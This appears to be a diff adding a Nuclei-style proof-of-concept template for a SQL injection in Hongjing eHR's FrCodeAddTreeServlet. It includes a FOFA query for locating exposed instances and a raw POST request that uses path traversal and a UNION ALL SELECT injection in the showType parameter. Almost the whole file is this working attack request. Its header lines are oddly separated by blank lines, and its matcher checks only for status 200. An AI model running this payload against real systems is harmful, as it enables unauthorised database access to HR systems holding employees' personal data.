@@ -1,0 +1,51 @@
+id: poc-uiro1sm09ud2n4bg
+info:
+  name: 宏景eHR FrCodeAddTreeServlet SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/uiro1sm09ud2n4bg'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: uiro1sm09ud2n4bg
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'POST /templates/attestation/../../servlet/FrCodeAddTreeServlet HTTP/1.1
+
+
+    Accept: */*
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: keep-alive
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    params=&issuperuser=&parentid=&privType=&manageprive=&action=&target=&showType=1%27+UNION+ALL+SELECT+%40%40version%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+&treetype=&orgtype=
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?SQL)(?=.*?TreeNode).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
